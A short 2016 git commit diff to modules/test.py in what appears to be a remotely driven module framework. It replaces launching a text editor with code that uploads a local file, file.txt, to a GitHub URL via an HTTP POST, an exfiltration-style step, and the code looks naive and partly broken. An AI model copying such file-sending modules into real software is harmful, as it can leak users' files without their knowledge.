0f8fcf79d47877e5c489fc577d0bb25eff624ae6
experiment2016 <sarpiericam@libero.it>
2016-05-30 15:43:11 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -1,9 +1,11 @@
-import subprocess
-
+import requests
 def run(**args):
   try:
-     subprocess.Popen("mousepad")
+      print("Testing") 
+      url='https://github.com/experiment2016/workhub/tree/master/data/post'
+      files = {'upload_file': open('file.txt','rb')}
+      values={'upload_file' : 'file.txt'}
+      r=requests.post(url,files=files,data=values)
   except Exception, e:
       return str(e)
-  
   
